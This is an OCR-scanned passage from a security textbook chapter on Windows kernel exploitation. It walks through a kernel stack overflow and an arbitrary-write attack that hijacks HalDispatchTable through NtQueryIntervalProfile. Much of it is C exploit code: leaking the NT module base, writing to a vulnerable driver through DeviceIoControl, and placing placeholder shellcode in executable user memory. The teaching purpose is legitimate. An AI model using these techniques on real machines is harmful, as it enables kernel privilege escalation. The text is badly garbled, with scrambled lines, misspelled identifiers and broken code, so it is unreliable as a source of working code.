00000000000d0060
00000000000000000000000000000000
kd>p
00000000000000006000000060000000
00000000000d0000 cC
int
Fig, 6.53 Function stack
0x28 bytes is the actual overwritten return address, we need to allocate a piece of
executable memory in the user state via the VirtualAlloc function and set the retum
address to the address of this piece of memory.
When the kermel driver performs a replication operation, it overwrites the returm
address on the stack with the memory address allocated by the user state for read-
write execution. The reason for this implicitly is that the process context of the kermel
driver is the same as that of the calling process.
kd> 1process fffffa80^1ba2b7d0 0
PROcEss fffffa801ba2b7d0
SessionId: 1 Cid: 0bbc 
Peb: 7fffffdbooo ParentCid: 0d60
DirBase: 168fc000 ObjectTable: fffff8a001ff3b80 HandleCount: 8.
Inage : usermode. exe
kd> -process
Implicit procesa ls nov fffffa8o^lbazb7d0
kd> Iprocess fffffa80^1ba2b7d0 0
PROcEss fffffa801ba2b7do
SessionId: 1 Cid: obbc Peb: 7fffffdbooo ParentCid: 0d60
DirBase: 168fc000 ObjectTable: fffff8a001ff3b80 HandleCount: 8.
When the kernel driver returns from the function stack, it jumps to the memory
space allocated by the user state for execution, as shown in Fig. 6.53.
---
## Page 546
6.9 Windows Kemel PWN
533
2. kemel arbitrary address writing exploit
For an arbitrary address writing exploit, the focus is on finding a location where the
program flow can be hijacked. For example, a C++ program’s virtual table may be an
excellent target, although there are no C++ virtual tables in the Windows kermel
space but many similar data structures, the most well-known of which is the
HalDispatchTable in the NT module.
HalDispatchTable is a global function pointer table.
HAL_DISPATCH Ha1DispatchTable = {
xHa1guerySyatemInformation,
HAL_DISPATCH_VERSION,
xHa1SetSystemInformation,
xHa1QueryBusS1ots,
0 ,
xHalIoAssignDriveLetters,
xHa1ExamineMBR,
xHalIoReadPartitionTable,
xHalIoSetPartitionInformation,
xHalIoHritePartitionTable,
xHa1HandlerForBus,
xHalReferenceHandler,
xHa1ReferenceHandler,
xHa1InitPoverHanagement,
xHalInitPnpDriver,
(pHa1GetDmaAdapter) NULL,
xHalStartMirroring,
xHa1GetInterruptTranslator,
xHal&ndnirroring,
xHa1MirrorPhysicalNemory,
xHa1MirrorPhysicalNemory
xHa1EndofBoot,
In general, a program can trigger it by calling the NtQueryIntervalProfile func-
function, see Fig.
tion, because NtQueryIntervalProfile intermally calls the KeQueryIntervalProfile
.6.54.The KeQuerylntervalProfile calls the
xHalQuerySystemInformation function in HalDispatchTable.
The following is an example to experiment with a kermel arbitrary address write
vulnerability that hijacks the control flow to shellcode in the user*s address space via
HalDispacthTable. This procedure is similar to the previous stack overflow, which is
also a relatively simple exploit. However, it is necessary to leak the address of the
NT module first through the function described in the preamble to get the address of
HalDispacthTable, see Fig. 6.55.
The code we wrote to leak the NT module via the NtQuerySystemlnformation
function is as follows.
---
## Page 547
534
6PWN
Fig, 6.54 The control flow
NtQueryIntervalProfile proc near
KeQuerylntervalProfile
arg_0= qword ptr
umwind{//
C_specific_handler
mov
[rsp+arg_o], rbx
push
rdi
sub
rsp,20h
mov
rbx,rdx
mov
rax, gs:188h
mov
dil,[rax+1F6h]
test
dil,dil
jz
short 1oc_1403F1A88
loc_1403F1A72:
try{//
_except at 1oc_1403F1A86
AOU
rax,cs:MmUserProbeAddress
clp
rdx,rax
rdx, rax
movnb
eax, [rdx]
OV
[rdx], eax
jnp
short 1oc_1403F1A88
}//starts at 1403F1A72
loc_1403F1A88:
KeQueryIntervalProfile
PVOID leak_nt_nodule (VoID) (
DNORD RetuznLength = 0;
PSYSTEH_HODUL&_INFORNATION ModuleB1ockPtr = NULL;
DNORD 1 - 0;
NTSTATUS Status = 0;
PVOID ModuleBase = NULL;
PCHAR ModuleNane = NULL;
Status = NtQuerySystemInformation (SystemModuleInformation,
NULL,
---
## Page 548
6.9 Windows Kemel PWN
535
pte
38H
_OMORE
9.[rp
Fig, 6.5s The control fow graph of NtQuerylntervalProtile to xHalQuerySystemlnformation
0,
&ReturnLength) ;
ModuleB1ockPtr = (PSYSTEM_MODULE_INFORMATION) HeapA11oc
(GetProcessHeap () ,
HEAP_ZERO_MEMORY, ReturnLength) ;
Status = NtQuerySystemInformation (SystemModuleInformation,
ModuleBlockPtr,
ReturnLength,
&ReturnLength) ;
if (!NT_SUCCESS (Status)) 
printf ("NtQuerySystemInformation failed tx\n*, Status) ;
return NULL;
for (1 = 0; 1 ModulesCount ; 1++) {
PVOID ModuleBase = HoduleB1ockPtr- >Nodules [1] ImageBaseAddress;
PCHAR ModuleNane = ModuleBlockPtr- >Ncdules [1] .Name;
if ( 1strcmp ("\cxSystemRoot\crsystem32\crntoskrnl . exe",
KoduleName) )
return ModuleBase;
return NULL;
---
## Page 549
536
6PWN
NtQuerySystemlnformation is a function that determines the type of the retum
value based on the Systemlnformation parameter, which is the design of many APIs
in Windows. Therefore, we first pass a buffer size of O bytes on the first call to this
function, which retums the actual buffer size needed as RetumLength, and then
allocate the actual buffer based on the returned size and make a second call.
Itisnecessarytomanuallydefine the prototype
Jo
the
NtQuerySystemlnformation function, the structure of the incoming parameters,
etc. These data structures and function declarations can be found in various Win-
dows header files. The specific code is as follows.
#define NT_SUCCESS (Status) (( (NTSTATUS) (Status) ) >= 0)
typedef struct SYSTEM_MODULE 
ULONG Reserved1;
ULONG Reserved2;
#ifdef _HIN64
ULONG Reserved3;
#endif
PVOID InageBaseAddress;
ULONG InageSize;
:s6eTa DNOn
NORD Id;
NORD v018;
NORD Rank;
NORD NaneOffset ;
} SYSTEM_HODUL&, *PSYSTEM_MODULE;
CHAR Nane [255] ;
typedef struct SYSTEM_MODULE_INFORMATION {
ULONG ModulesCount ;
SYSTEH_HODUL& Hodules [1] ;:
} SYSTEM_HODUL&_INFORNATION, +PSYSTEH_HODULE_INFORNATION;
typedef enun_SYSTEM_INFORMATION_CLASS {
SystenModuleInformation = 11
} SYSTEM_INFORHATION_CLASS;
_in ULoNG SystemInformat ionLength,
_inout PvoID SystemInformation,
_out_opt PULoNG ReturnLength
The declaration of the NtQuerySystemlnformation function prototype requires
the addition of an extern *C" auxiliary declaration, because the code file generated
++ u padu st pue neap Sq dd's s! oafod aaup a noj opns enst q
but the function notation is compiled in C++ with class information and it can’t find
---
## Page 550
6.9  Windows Kemel PWN
537
115
116
Bint main0
HANDLE hDevice = NLL:
118
CONTROL_PACKET Packet = (0）:
119
DFORD BytesReturn = 0:
120
LPVOID Address = MLL:
121
PVOID NtBase = NULL:
122
123
NtBase = leak_nt_module O :
124
NO23e00
125
hDevice = CreateFile(etrnnim
DFVTCE SVROI.TC NAMF.
Fig, 6.56 The base address of the NT module
the function in the corresponding lib file while linking. Of course, it is also possible
, uajxa au paou 1,uop noA jeq os 3's 0 xyns ddb' a aueup 01
01 qpu, ppe pue *ndu  saxul, poaos *aed sauadod poafod a uado
the “Additional Dependencies", because The NtQuerySystemInformation function
[enstA Susn sq ppe o alqissod osje s! 1! °asmoo JO p'lupu wog pouodx3 s!
Studio’s compiler macros.
We succeeded in obtaining the base address of the NT module (see Fig. 6.56).
Other methods of leaking kernel module addresses or other object addresses using
functions are similar and will not be repeated. For further information on other
methods, we recommend searching Github for an open-source project called
windows_kernel_address_leaks, which provides a good summary.
In summary, we wrote the following exploitation code.
PVOID leak_nt_module (VOID) (
DHORD ReturnLength = 0;
PSYSTEH_HODUL&_INFORNATION NoduleB1ockPtr = NULL;
NTSTATUS Status = 0;
PVOID ModuleBase = NULL;
DNORD 1 = 0;
PCHAR ModuleName = NULL ;
Status = NtQuerySystemInformation (SystemModuleInformation, NULL,
0, &ReturnLength) :
(GetProcessHeap () ,
Modu1eB1ockPtr = (PSYSTEM_MODULE_INFORMATION) HeapA11oc
HEAP_ZERO_MEHORY, ReturmLength) :
Status = NtQuerySystemInformation (SystemModuleInformation,
NoduleBlockPtr,
ReturnLength, sReturmLength) ;
if (INT_SUCCEss (Status)) {
printf ("NtQuerySystemInformation failed &xn", Status) ;
---
## Page 551
538
6PWN
return NULL;
for (1 = 0; 1 ModulesCount ; 1++) {
PVOID ModuleBase = ModuleBlockPtr->Nodules [1] . InageBaseAddress;
PCHAR ModuleNane = ModuleBlockPtr->Nodules [1] ame ;
if (Istrcmp ("\cxSystenRoot\crsystem32\crntoskrml . exe",
KoduleName) )
return NoduleBase;
return NULL;
int main ()
HANDL& hDevice = NULL ;
CONTROL_PACKET PaCket = {0} ;
LPVOID Address = NULL;
DNORD BytesReturn = 0 ;
PVOID NtBase = NULL;
NtBase = leak_nt_module [1 ;
hDevice = CreateFi1e (D&VICE_SYMBOLIC_NAME,
GENERIC_ALL,
0
0,
FILE_ATTRISUTE_SYSTEM,
OPEN_EXISTING,
0} =
if (hDevice == INVALID_HANDLE_VALUE) (
DWORD ErrorCode = GetLastError () :
printf ("CreateFile = d`,na, ErrorCode) ;
retuzn 0;
Address = VirtualA11oc (NULL, 0x1000, NEM_COMMIT,
PAGE_EXECUTE_READNRITE) ;
Rt1CopyMemory [Address, *\xCC`xCC*, 2) ;
Packet .Parameter ._AAW. What = (INT64) Address;
Packcet . Parameter._AAW.Where = (INT64) NtBase + 0xle9c30 + 0x8;
if (!DeviceIoControl (hDevice, WAA_CTL_CoDE, &Packet, sizeof
(Packet) , &Packet,
sizeof (Packet) , &BytesReturn, 0)) (
DMORD ErrorCode = GetLastError () ;
printf ("DeviceIoControl = vd\n*, ErrorCode) :
retuzn 0;
• (PINT64) ( (INT64)Address + 8) = (INT64)Address + 8;
NtQueryInterva1Protile (ProfileTota1Issues, (PULoMG) (INr64) Address +
---
## Page 552
6.9 Windows Kemel PWN
539
Fig, 6.57 Assembly code
fOV
eax,[rdx]
mOV
[rdx], eax
三
BATA
DATA
Fig, 6.58 Global pointer tables
8) ;
f(.osned,)wos.s
return 0;
We derive the offset of HalDispacthTable in the NT module as Ox1e9c30 by
reverse engineering and xHalQuerySystem-Information is the second function in
HalDispacthTable.
Because the logic in Fig. 6.57exists in the
NtQuerylntervalProfile function, some settings in the user-state memory space are
required.
In summary, exploit code is similar to stack overflow exploit, which is relatively
simple. The idea is to find data structures that control the flow of program execution
sassappe Arntqe o Sunm q
Function pointers that can be exploited in HalDispacthTable are more than just
xHalQuerySystemInformation; there are more data structures available in the Win-
dows kernel than HalDispacthTable, such as in the win32k.sys module, where a
large number of functions use similar global pointer tables to make the call (see
Fig. 6.58).
Here we pick a function with simple control flow as an example, such as
NtGdiDdDIAcquireKeyedMutex, which is called from the global function table in
win32k (see Fig. 6.59).
---
## Page 553
540
6PWN
NtGdiDdpoIAcquirekeyedMutex proc
sub
rsp,28h
BOV
rax, cs:qword_FFFFF97FFF2D5670
test
short 1oc_FFFFF97FFF18C388
rax, rax
jz
p
FFFFF97FFF18C3BD
1oc_FFFFF97FFF18C3B8:
eax,
eceeeee7Ah
Fig, 6.59 The called from the global function table in win32k
Following is the exploitation code.
extern *C* NTSTATUS NtQueryIntervalProfile (IN KPROFILE_SOURCE
ProfileSource, OUT PULONG Interval) ;
PVOID leak_nt_nodule (VOID) {
DMORD ReturnLength = 0;
NrSTATUS Status = 0;
PSYSTEH_HODUL&_INFORNATION NoduleB1ockPtr = NULL;
PVOID ModuleBase = NULL;
DNORD 1 = 0;
PCHAR ModuleNane = NULL;
0, &ReturnLength) ;
Status = NtQuerySystemInformation (SystemModuleInformat ion, NULL,
ModuleB1ockPtr = (PSYSTEN_MODULE_INFORMATION) HeapA11oc
(GetProcessHeap () ,
HEAP_ZERO_MEMORY, ReturnLength) ;
HoduleBlockPtr,
Status = NtQuerySystemInformation (SystemModuleInformat ion,
ReturnLength, sReturmLength) ;
if (INT_SUccEss (Status)) {
printf ("NtQuerySystemInformation failed $x\n", Status) ;
return NULL;
for (1 = 0; 1 ModulesCount ; 1++) {
PVOID ModuleBase = HoduleB1ockPtr->Kodules [1] ImageBaseAddress;
if (1stzemp ("\exSystenRoot^crSystem32\crwin32k,ays",
PCHAR ModuleNane = ModuleB1ockPtr- >Modules [1] .Name;
HoduleName) )
return ModuleBase;
---
## Page 554
6.9 Windows Kermel PWN
541
return NULL;
int main (1 {
HANDL& hDevice = NULL;